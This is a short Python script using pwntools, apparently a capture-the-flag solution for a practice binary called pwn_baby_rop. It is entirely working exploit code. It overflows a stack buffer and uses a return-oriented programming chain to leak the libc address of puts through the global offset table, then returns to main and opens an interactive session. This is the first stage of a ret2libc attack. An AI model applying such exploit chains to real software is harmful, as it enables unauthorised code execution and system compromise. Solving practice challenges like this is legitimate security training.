from pwn import *

io = process("./pwn_baby_rop")

io.recvuntil("black magic.\n")

#gdb.attach(io)

# 1st stage
pop_rdi = 0x00401663
puts_got = 0x404018
puts = 0x401060
main = 0x40145C

payload = b""
payload += b"A" * 256
payload += b"B" * 8
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts)
payload += p64(main)

io.sendline(payload)
puts_addr = io.recvline()[:-1].ljust(8, b"\x00")
puts_addr = u64(puts_addr)
log.info("puts: " + hex(puts_addr))

io.interactive()
